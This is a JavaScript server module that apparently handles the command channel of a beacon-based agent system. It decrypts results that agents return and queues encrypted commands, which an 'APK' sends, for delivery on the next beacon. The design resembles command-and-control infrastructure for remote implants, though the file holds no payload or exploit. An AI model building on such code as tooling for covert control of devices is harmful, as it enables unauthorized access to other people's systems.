import { decryptPayload, encryptResponse } from '../crypto.js';
import { agents, queueCommand } from './beacon.js';

export async function handleCommand(request, env, agentId, body) {
  if (!body) {
    return new Response(JSON.stringify({error: 'Empty command'}), {status: 400, headers: {'Content-Type': 'application/json'}});
  }
  
  try {
    const decrypted = await decryptPayload(body, env.MASTER_KEY);
    if (!decrypted) {
      return new Response(JSON.stringify({error: 'Decryption failed'}), {status: 400, headers: {'Content-Type': 'application/json'}});
    }
    
    const result = JSON.parse(new TextDecoder().decode(decrypted));
    
    // Store command result
    const agent = agents.get(agentId);
    if (agent) {
      // Find and mark command as completed
      for (const cmd of agent.commands) {
        if (cmd.sequence === result.seq) {
          cmd.sent = true;
          cmd.result = result;
          cmd.completed_at = Date.now();
          break;
        }
      }
    }
    
    return new Response(JSON.stringify({ok: true}), {status: 200, headers: {'Content-Type': 'application/json'}});
    
  } catch (e) {
    return new Response(JSON.stringify({error: 'Invalid command result'}), {status: 400, headers: {'Content-Type': 'application/json'}});
  }
}

// API for APK to send commands
export async function sendCommandToAgent(agentId, command, masterKey) {
  const agent = agents.get(agentId);
  if (!agent) return {error: 'Agent not found'};
  
  const sequence = Date.now();
  const cmd = {
    type: command.type,
    payload: command.payload,
    sequence,
    sent: false,
    queued_at: Date.now()
  };
  
  agent.commands.push(cmd);
  
  // Encrypt for delivery on next beacon
  return await encryptResponse([cmd], masterKey);
}